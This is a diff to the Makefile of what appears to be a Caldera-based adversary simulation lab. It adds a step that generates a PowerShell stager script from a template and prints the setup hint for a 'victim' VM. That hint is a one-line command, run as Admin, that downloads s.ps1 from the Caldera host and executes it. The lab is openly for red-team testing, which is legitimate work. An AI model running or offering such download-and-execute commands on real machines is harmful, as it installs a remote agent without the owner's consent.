@@ -44,7 +44,7 @@ help:
 # ── Install (first-time) ──────────────────────────────────────────────────────
 
 .PHONY: install
-install: _install-deps _check-docker _env _setup-ai _setup-tools _detect-labops _generate-caldera-keys _ghcr-auth _pull-caldera _up _wait-healthy _setup-n8n-owner _import-workflows sandcat profiles mitre-update
+install: _install-deps _check-docker _env _generate-s-ps1 _setup-ai _setup-tools _detect-labops _generate-caldera-keys _ghcr-auth _pull-caldera _up _wait-healthy _setup-n8n-owner _import-workflows sandcat profiles mitre-update
 	@echo ""
 	@echo "╔══════════════════════════════════════════════════════════════╗"
 	@echo "║   Sophos Adversary Simulation Platform — Ready              ║"
@@ -64,7 +64,9 @@ install: _install-deps _check-docker _env _setup-ai _setup-tools _detect-labops 
 	@echo "  Next steps:"
 	@echo "    • LabOps VMs: sandcat is deployed automatically during 'make provision'"
 	@echo "    • Manual VM:  on the victim (PowerShell as Admin):"
-	@echo "       powershell -c \"iex(iwr 'http://<your-docker-host-ip>:8081/s.ps1' -UseBasicParsing)\""
+	@CALDERA_H=$$(grep '^CALDERA_HOST=' .env 2>/dev/null | cut -d'=' -f2); \
+	if [ -z "$$CALDERA_H" ]; then CALDERA_H="<your-host-ip>"; fi; \
+	echo "       powershell -c \"iex(iwr 'http://$$CALDERA_H:8081/s.ps1' -UseBasicParsing)\""
 	@echo ""
 
 # ── Core stack operations ─────────────────────────────────────────────────────
@@ -373,6 +375,22 @@ _env:
 	else \
 		echo "✅ N8N_PASSWORD is set"; \
 	fi
+
+.PHONY: _generate-s-ps1
+_generate-s-ps1:
+	@echo "▶ Generating s.ps1 from template..."
+	@CALDERA_H=$$(grep '^CALDERA_HOST=' .env 2>/dev/null | cut -d'=' -f2); \
+	if [ -z "$$CALDERA_H" ]; then \
+		CALDERA_H=$$(hostname -I 2>/dev/null | awk '{print $$1}' || ipconfig getifaddr en0 2>/dev/null || echo "localhost"); \
+		echo "   CALDERA_HOST not set in .env — auto-detected: $$CALDERA_H"; \
+		echo "   (Set CALDERA_HOST in .env to override — required for VPS or remote installs)"; \
+	fi; \
+	if [ "$$(uname)" = "Darwin" ]; then \
+		sed "s/CALDERA_HOST/$$CALDERA_H/g" nginx/html/s.ps1.tpl > nginx/html/s.ps1; \
+	else \
+		sed "s/CALDERA_HOST/$$CALDERA_H/g" nginx/html/s.ps1.tpl > nginx/html/s.ps1; \
+	fi; \
+	echo "✅ s.ps1 generated (CALDERA_HOST=$$CALDERA_H)"
 
 .PHONY: _detect-labops
 _detect-labops:
